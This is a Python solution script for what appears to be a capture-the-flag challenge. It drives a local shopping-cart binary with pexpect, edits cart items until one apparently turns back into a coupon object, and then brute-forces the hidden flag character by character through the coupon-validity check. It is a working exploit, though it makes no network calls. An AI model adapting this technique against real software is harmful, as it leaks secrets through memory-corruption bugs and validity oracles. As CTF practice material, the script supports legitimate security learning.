#!/usr/bin/env python3
import pexpect
import string
import time
import os

PROG_NAME = "main"

END_CHAR = '}'

MENU_DICT = {
	"add_item" : '1',
	"edit_item" : '2',
	"remove_item" : '3',
	"view_cart" : '4',
	"apply_coupons":'5',
	"checkout" : '6'
}

EDIT_DICT = {
	'kilograms' : '2',
	'ammount_items' : '3',
	'loaves' : '4'
}

def add_item(proc, item_type = 'f'): # default type is fruit
	proc.sendline(MENU_DICT['add_item'])
	proc.sendline(item_type)
	get_welcome(proc)

def edit_item(proc, index, item=None, new_val=None):
	proc.sendline(MENU_DICT['edit_item'])
	proc.sendline(str(index))
	idx = proc.expect(["Can not edit this item!\r\n", "Cancel\r\n"])
	can_edit = idx == 1
	if can_edit:
		proc.sendline(item)
		proc.sendline(str(new_val))
	get_welcome(proc)
	return can_edit

def remove_item(proc, index):
	proc.sendline(MENU_DICT['remove_item'])	
	proc.readline() # "which item index would you like to remove"
	proc.sendline(str(index))
	get_welcome(proc)

def apply_coupon(proc, coupon="hello"):
	proc.sendline(MENU_DICT['apply_coupons']) 
	proc.sendline(coupon) # apply coupon
	res = proc.expect(["Invalid", "Applied"])
	is_valid = (res == 1)
	get_welcome(proc)
	return is_valid

def view_cart(proc):
	proc.sendline(MENU_DICT['view_cart'])
	proc.expect("What")
	print(proc.before.decode())
	get_welcome(proc)

def checkout(proc):
	proc.sendline(MENU_DICT['checkout'])
	proc.expect(pexpect.EOF)
	print(proc.before.decode())

def get_welcome(proc):
	proc.expect("Checkout\r\n")
	return proc.before.decode()

def read_welcome(proc):
	print(get_welcome(proc))

def crack_char(proc, discovered):
	for c in string.printable:
		os.system("clear")
		print(f"attempted char: {c} || overall: {discovered + c}")
		time.sleep(0.1)
		is_valid = apply_coupon(proc, discovered + c)
		if is_valid:
			return c
	assert False, "shouldn't have made it here"

def main():
	proc = pexpect.spawn("./" + PROG_NAME)
	get_welcome(proc)
	apply_coupon(proc) # load coupons into memory
	remove_item(proc, 0) # remove 10% coupon
	remove_item(proc, 1) # remove 50% coupon
	add_item(proc)
	add_item(proc)

	discovered = ""
	last_char = ""

	while last_char != END_CHAR:
		remove_item(proc, 2)
		add_item(proc)
		edit_item(proc, 2, EDIT_DICT['loaves'], len(discovered)+1)
		edit_item(proc, 2, EDIT_DICT['kilograms'], 0)
		edit_item(proc, 2, EDIT_DICT['ammount_items'], 0)
		edit_item(proc, 2) # can't edit, transforms back to coupon
		last_char = crack_char(proc, discovered)
		discovered += last_char
		print(f"last char: {last_char} || overall: {discovered}")
		time.sleep(0.5)

	print(f"\n\n\nThe flag is:\n {discovered}")

if __name__ == '__main__':
	main()